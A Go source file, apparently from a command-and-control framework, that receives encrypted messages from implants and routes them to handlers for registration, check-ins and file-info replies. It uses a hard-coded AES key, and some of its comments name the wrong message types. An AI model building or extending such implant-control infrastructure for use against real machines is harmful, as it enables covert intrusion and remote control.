//This file contains all related functionality to handling incoming messages sent by implants.

package main

import (
	"KitsuneC2/lib/communication"
	"encoding/json"
	"fmt"
	"log"
	"net"
)

// we use some clever reflection design so that we do not have to make a huge switch statement containing all possible messageTypes.
// all message types and their corresponding functions can be called through the map below and the one in serializable.go
var messageTypeToFunc = map[int]func(net.Conn, interface{}){
	0: handleImplantRegister,
	1: handleCheckin,
	//reserved for implant functionality
	12: handleFileInfoResp,
}

// This function can be passed to a listener to handle incoming connections.
func tcpHandler(conn net.Conn) {
	envelope, err := communication.ReceiveEnvelope(conn, []byte("thisis32bitlongpassphraseimusing")) //TODO: change aes key to a proper one :)
	if err != nil {
		log.Printf("[ERROR] Could not understand message sent by implant. Reason: %s", err.Error())
	}

	handlerFunc := messageTypeToFunc[envelope.MessageType]
	reflectionHelper := communication.MessageTypeToStruct[envelope.MessageType] //this variable contains a pointer to a function that will return the datastructure belonging to messageType
	if handlerFunc == nil || reflectionHelper == nil {
		log.Printf("[WARN] Envelope with invalid messageType was sent. Aborting connection with: %s", conn.RemoteAddr().String())
		conn.Close()
		return
	}
	data := reflectionHelper() //call the reflectionHelper function that will return the datatype corresponding to our messagetype
	err = json.Unmarshal(envelope.Data, data)
	if err != nil {
		log.Printf("[ERROR] Could not unmarshal decrypted data. Aborting connection with: %s", conn.RemoteAddr().String())
		conn.Close()
		return
	}
	handlerFunc(conn, data)
}

//-------------------Begin message handlers--------------------

// Handles envelopes with messageType==0. This is the very first message an implant sends to the server.
func handleImplantRegister(conn net.Conn, data interface{}) {
	defer conn.Close()
	implantRegister, ok := data.(*communication.ImplantRegister)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=0 (ImplantRegister), but could not convert envelope data to ImplantRegister datastructure")
	}
	fmt.Println(implantRegister.UID)
}

// Handles envelopes with messageType==1. Every x amount of time, an implant sends a check-in message which this function handles.
func handleCheckin(conn net.Conn, data interface{}) {
	defer conn.Close()
	implantCheckin, ok := data.(*communication.ImplantCheckin)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=1 (Checkin), but could not convert envelope data to Checkin datastructure")
	}
	fmt.Println(implantCheckin.ImplantId)
}

// Handles envelopes with messageType==11. The implant sends this message when the server sends a request for fileInfo.
func handleFileInfoResp(conn net.Conn, data interface{}) {
	defer conn.Close()
	fileInfoResp, ok := data.(*communication.FileInfoResp)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=2 (FileInfoResp), but could not convert envelope data to FileInfoResp datastructure")
	}
	fmt.Printf("name: %s\nsize: %d\nmode: %s\nmodTime: %d\nisDir: %t", fileInfoResp.Name, fileInfoResp.Size, fileInfoResp.Mode, fileInfoResp.ModTime, fileInfoResp.IsDir)
}
